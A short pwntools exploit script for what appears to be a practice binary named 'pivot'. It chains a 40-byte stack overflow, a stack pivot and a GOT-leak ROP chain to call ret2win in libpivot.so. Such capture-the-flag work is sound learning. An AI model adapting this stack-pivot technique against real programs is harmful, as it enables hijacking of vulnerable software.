from pwn import *

elf = ELF("./attachment/pivot")
rop = ROP(elf)
lib = ELF("./attachment/libpivot.so")

io = process(elf.path, cwd="./attachment", level="DEBUG")

io.recvuntil(b"pivot: ")
pivot_address = int(io.recvline().strip(), 16)

payload_stack_smash = b"".join([
    b"A" * 40,  # offset
    p64(0x004009bb),  # pop rax; ret
    p64(pivot_address),  #
    p64(0x004009bd),  # xchg rax, rsp; ret
])

payload_rop_chain = b"".join([
    p64(elf.plt.foothold_function),  # 
    p64(0x004009bb),  # pop rax; ret
    p64(elf.got.foothold_function),  # 
    p64(0x00400829),  # pop rbp; ret
    p64(lib.symbols.ret2win - lib.symbols.foothold_function),  #
    p64(0x004009c0),  # mov rax, qword [rax]; ret
    p64(0x004009c4),  # add rax, rbp; ret
    p64(0x004006b0),  # call rax; ret
])

io.sendline(payload_rop_chain)
io.sendline(payload_stack_smash)
io.recvall()